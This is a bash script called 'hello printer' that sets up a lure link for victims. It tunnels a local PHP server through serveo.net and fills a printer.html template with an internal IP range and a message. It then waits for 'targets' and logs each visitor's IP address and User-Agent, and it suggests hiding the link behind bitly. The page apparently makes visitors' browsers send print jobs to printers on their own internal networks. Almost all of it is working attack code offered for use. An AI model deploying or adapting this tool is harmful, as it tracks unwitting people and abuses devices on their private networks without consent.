#!/bin/bash
# hello printer v1.0
# coded by: @linux_choice
# github.com/thelinuxchoice/helloprinter
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {


printf "\e[1;77m                /\             /\ \n"
printf "               |\` \_,--=\"=--,_//\`|   \n"
printf "               \ .\"  :'. .':  \". / \n"
printf "              ==)  _ :  '  : _  (== \n"
printf "                |>/\e[1;93mO\e[0m\e[1;77m\   _   /\e[1;93mO\e[0m\e[1;77m\<| \n"
printf "                | \-\"~\` _ \`~\"-/ | \n"
printf "               >|\`===. \_/ .===\`|< \n"
printf "         .-\"-.   \\==='  |  '===/   .-\"-. \n"
printf "   -----{'. '\`}---\,  .-'-.  ,/---{.'. '}----- \n"
printf "        \`\"---\"\`     \`~-===-~\`     \`\"---\"\` \e[0m\n"
printf "\e[1;93m  _        _ _                _     _            \n"
printf " | |_  ___| | |___   _ __ _ _(_)_ _| |_ ___ _ _  \n"
printf " | ' \/ -_) | / _ \ | '_ \ '_| | ' \  _/ -_) '_| \n"
printf " |_||_\___|_|_\___/ | .__/_| |_|_||_\__\___|_|   \n"
printf "                    |_|                          \e[0m\n"

printf " \e[1;77mv1.0 coded by @linux_choice \n"
printf " \e[1;77mgithub.com/thelinuxchoice/helloprinter\e[0m \n"

printf "\n"


}

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {



command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 


}


catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt

printf "\n"
rm -rf iptracker.log
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] \e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

}



checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] Target opened!\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5



done 

}


server() {


printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 4

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Obfuscation URL use bitly.com (insert above link without https)\e[0m\n'


}


payload() {

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] In Chrome and Firefox the Internal IP should be detected automatically\e[0m\n"
default_localip="192.168.1.0"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Internal IP Address (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_localip
read localip
localip="${localip:-${default_localip}}"

IFS=$'\n'
default_message="Say hello to my cat"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Message to print (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_message
read message
message="${message:-${default_message}}"


new_message=$(echo $message | sed 's/ /_/g')

sed 's+local_ipaddress+'$localip'+g' printer.html | sed 's+custom_message+'$new_message'+g' > index2.html




}

start() {

payload
default_choose_sub="Y"
default_subdomain="sayhello$RANDOM"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi


server
checkfound

}
banner
dependencies
start

